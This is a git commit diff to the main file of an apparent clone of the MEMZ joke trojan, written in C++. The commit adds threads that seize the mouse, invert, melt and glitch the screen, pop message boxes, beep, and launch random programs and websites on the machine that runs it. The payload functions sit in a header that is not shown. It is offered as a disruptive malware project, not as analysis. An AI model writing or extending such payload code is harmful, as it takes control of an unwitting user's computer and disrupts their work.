36e25b53029562b39338e70cb5989ac3729d8b27
Kris <KrisTHL181@outlook.com>
2023-06-23 01:06:57 +0800

    Debug & Dewarn

--- Main.cpp
+++ Main.cpp
@@ -1,21 +1,32 @@
-#include <thread>
+#include <thread> // I Don't Know Why It Cannot Build In MEMZ.h
 #include "MEMZ.h" // Process Main 
 
 using namespace std;
 
-int main(){
-    // SetConsoleRoundCorners(random_in(10,200),random_in(10,200),random_in(10,30)); // Setting Random Round Corners (Bugful)
+int main()
+{
+	sayNyan(); // Your computer was not trashed by the MEMZ Trojan. Now you can't enjoy the Nyan Cat~
+	disable_redraw(); // Disable Redraw
+	// Main Process Zone //
     thread a(infclick); // Random Click
     thread b(infInvColor); // Invert Screen Color
     thread c(infIcon); // Random Draw Icons
     thread d(infCursor); // Random Move Mouse
     thread e(infChange); // Invert String
-    thread f(inftunnel); // Draw Tunnel Effect 
+    thread f(inftunnel); // Draw Tunnel Effect
     thread g(randomDraw); // Random Draw Lines
-    thread h(infplay); // Play System Error Sounds
-    thread i(infBlink); // Screen Blink
-    thread j(InvertColor_slow); // Invert Screen Color (Slow) Like "Nepotonod"
-    thread k(ScreenMelter); // Screen Melter Like "Nepotonod"
-    thread l(infShock); // Window Shocker
-    scanf("%s"); // Pause Program
+	thread h(infplay); // Play System Error Sounds
+	thread i(infBlink); // Screen Blink
+	thread j(InvertColor_slow); // Invert Screen Color (Slow) Like "Nepotonod"
+	thread k(ScreenMelter); // Screen Melter Like "Nepotonod"
+	thread l(infShock); // Window Shocker
+	thread m(randomExecute); // Random Execute Some Programs/Websites
+	thread n(iconAura); // Draw Icons Around The Mouse
+	thread o(randomSeed); // Generate A New Random Seed Per 300ms
+	thread p(payloadMessageBox); // Pop Message Boxs
+	thread q(infglitch); // Glitch Screen
+	thread r(randomOutput); // Random Print Texts
+	thread s(rand_beep); // Random Beep
+    getchar(); // Pause Program
+	return 0; // Normal Exit
 }
